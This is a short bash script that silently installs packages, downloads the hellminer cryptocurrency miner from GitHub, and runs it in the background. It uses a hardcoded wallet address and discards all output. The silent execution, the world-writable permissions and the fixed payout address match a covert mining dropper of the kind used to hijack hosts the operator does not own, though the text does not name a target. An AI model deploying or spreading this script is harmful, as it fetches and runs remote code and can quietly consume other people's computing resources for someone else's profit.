#!/bin/bash

user="RKPZr9ktS9cSVXM23dzNqjH9ur6ao6JerM"
mode="${1:-0}"

[ -n "$user" ] || exit 1

sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget procps libsodium-dev >/dev/null 2>&1 || apt -qqy install wget procps libsodium-dev >/dev/null 2>&1

tmp=`mktemp -d`
wget -qO- https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz |tar -zx -C "$tmp"

cd "${tmp}"; chmod 777 -R ./; rm -rf ./*.sh; mv h* hm

if [ "$mode" == "0" ]; then
  ./hm -u ${user} -p d=16384S --cpu 1 >/dev/null 2>&1 &
else
  ./hm -u ${user} -p d=16384S --cpu 1 >/dev/null 2>&1
fi
